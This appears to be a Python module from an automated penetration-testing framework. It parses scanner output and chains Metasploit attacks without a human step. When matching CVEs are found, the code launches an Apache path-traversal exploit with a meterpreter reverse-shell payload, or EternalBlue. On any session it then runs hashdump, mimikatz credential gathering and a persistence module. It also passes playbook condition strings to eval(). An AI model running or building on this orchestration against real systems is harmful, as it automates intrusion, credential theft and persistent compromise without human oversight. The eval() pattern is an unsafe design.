import json
import re
import logging
from typing import Any, Dict, List, Optional, Tuple
from .database import save_state, load_state
from .tasks import build_phase_workflow
from celery import chain, group
from .celery_app import app

logger = logging.getLogger(__name__)

class DecisionEngine:
    def __init__(self, target: str):
        self.target = target
        self.state = load_state(target) or {}
        self.results_cache = {}

    def evaluate_phase(self, phase_name: str, phase_results: List[Dict]) -> Dict[str, Any]:
        """Process results of a completed phase and update state."""
        self.results_cache[phase_name] = phase_results

        for item in phase_results:
            tool = item.get('tool')
            if tool == 'nuclei':
                self._process_nuclei_results(item)
            elif tool == 'nikto':
                self._process_nikto_results(item)
            elif tool == 'metasploit':
                self._process_metasploit_results(item)
            elif tool == 'sqlmap':
                self._process_sqlmap_results(item)
            elif tool == 'nmap':
                self._process_nmap_results(item)
            elif tool == 'gobuster':
                self._process_gobuster_results(item)
            elif tool == 'ffuf':
                self._process_ffuf_results(item)

        save_state(self.target, self.state)
        return self.state

    def _process_nuclei_results(self, item):
        result = item.get('result', {})
        findings = result.get('findings', [])
        vulns = []
        for f in findings:
            title = f.get('title', '')
            if 'CVE' in title:
                cve_match = re.search(r'CVE-\d{4}-\d+', title)
                if cve_match:
                    vulns.append({
                        'cve': cve_match.group(0),
                        'severity': f.get('severity', 'unknown'),
                        'title': title
                    })
        if vulns:
            self.state.setdefault('vulnerabilities', []).extend(vulns)
            self.state['vuln_found'] = True

    def _process_nikto_results(self, item):
        result = item.get('result', {})
        issues = result.get('issues', [])
        if issues:
            self.state.setdefault('nikto_issues', []).extend(issues)
            self.state['vuln_found'] = True

    def _process_metasploit_results(self, item):
        result = item.get('result', {})
        sessions = result.get('sessions', [])
        if sessions:
            self.state.setdefault('sessions', []).extend(sessions)
            self.state['has_session'] = True
        # Also check for exploits executed
        if result.get('vulnerable'):
            self.state['vuln_found'] = True

    def _process_sqlmap_results(self, item):
        result = item.get('result', {})
        if result.get('vulnerable'):
            self.state['sql_injection'] = True
            self.state['vuln_found'] = True

    def _process_nmap_results(self, item):
        result = item.get('result', {})
        ports = result.get('ports', [])
        if ports:
            self.state.setdefault('open_ports', []).extend(ports)

    def _process_gobuster_results(self, item):
        result = item.get('result', {})
        dirs = result.get('directories', [])
        if dirs:
            self.state.setdefault('directories', []).extend(dirs)

    def _process_ffuf_results(self, item):
        result = item.get('result', {})
        finds = result.get('results', [])
        if finds:
            self.state.setdefault('ffuf_finds', []).extend(finds)

    def decide_next_phase(self, playbook_phases: List[Dict]) -> List[Dict]:
        """Given the playbook phases, decide which to run based on current state."""
        to_run = []
        for phase in playbook_phases:
            when_cond = phase.get('when')
            if when_cond:
                if not self._evaluate_condition(when_cond):
                    continue
            depends = phase.get('depends_on', [])
            skip = False
            for dep in depends:
                dep_result = self.results_cache.get(dep)
                if dep_result is None:
                    continue
                for item in dep_result:
                    if item.get('result', {}).get('error'):
                        logger.warning(f"Skipping phase {phase['name']} due to error in dependency {dep}")
                        skip = True
                        break
                if skip:
                    break
            if skip:
                continue
            to_run.append(phase)
        return to_run

    def _evaluate_condition(self, condition: str) -> bool:
        """Evaluate a condition string against the current state."""
        try:
            # Simple evaluator: replace known state keys with their values
            expr = condition
            for key, value in self.state.items():
                if isinstance(value, (str, int, float, bool)):
                    expr = expr.replace(key, repr(value))
                elif isinstance(value, list):
                    # For list membership, e.g., 'CVE-2021-41773' in vulnerabilities
                    # We'll just check if any element matches the condition? 
                    # For simplicity, we use a basic eval with restricted globals.
                    pass
            # Use eval with safe globals
            allowed = {'True': True, 'False': False, 'None': None}
            return eval(expr, allowed, {})
        except Exception as e:
            logger.error(f"Condition evaluation error: {e}")
            return False

    def generate_post_phase_actions(self, phase_name: str, phase_results: List[Dict]) -> List[Dict]:
        """Generate additional tasks based on phase results."""
        actions = []
        # If we have vulnerabilities and Metasploit is available, trigger exploit.
        if self.state.get('vuln_found') and self.state.get('vuln_found') is not False:
            for vuln in self.state.get('vulnerabilities', []):
                cve = vuln.get('cve')
                if cve:
                    # Simple mapping of CVEs to Metasploit modules
                    if cve in ['CVE-2021-41773', 'CVE-2021-42013']:
                        actions.append({
                            'tool': 'metasploit',
                            'args': [
                                'exploit/multi/http/apache_path_traversal',
                                f'RHOSTS={self.target}',
                                'PAYLOAD=linux/x64/meterpreter/reverse_tcp',
                                'LHOST=0.0.0.0'
                            ],
                            'when': 'always'
                        })
                    elif cve == 'CVE-2017-0143' or cve == 'MS17-010':
                        actions.append({
                            'tool': 'metasploit',
                            'args': [
                                'exploit/windows/smb/ms17_010_eternalblue',
                                f'RHOSTS={self.target}'
                            ],
                            'when': 'always'
                        })
        # If we have sessions, run post‑exploitation modules.
        if self.state.get('has_session'):
            actions.extend([
                {'tool': 'metasploit', 'args': ['post/windows/gather/hashdump', 'SESSION=1']},
                {'tool': 'metasploit', 'args': ['post/windows/gather/credentials/mimikatz', 'SESSION=1']},
                {'tool': 'metasploit', 'args': ['post/windows/manage/persistence_exe', 'SESSION=1']},
            ])
        return actions